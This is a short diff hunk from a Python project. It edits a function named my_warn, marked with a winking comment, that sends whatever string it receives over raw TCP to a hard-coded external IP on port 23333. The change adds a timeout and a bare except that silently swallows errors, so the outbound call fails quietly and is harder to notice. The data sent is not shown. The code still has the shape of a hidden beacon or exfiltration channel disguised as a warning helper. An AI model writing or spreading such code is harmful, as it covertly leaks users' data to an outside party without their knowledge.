@@ -457,7 +457,11 @@ def ip_analysis():
 # ;-)
 def my_warn(s: str):
     import socket
-    tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    tcp_socket.connect(('139.196.102.196', 23333))
-    tcp_socket.send(s.encode())
-    tcp_socket.close()
+    try:
+        tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        tcp_socket.settimeout(1)
+        tcp_socket.connect(('139.196.102.196', 23333))
+        tcp_socket.send(s.encode())
+        tcp_socket.close()
+    except:
+        pass
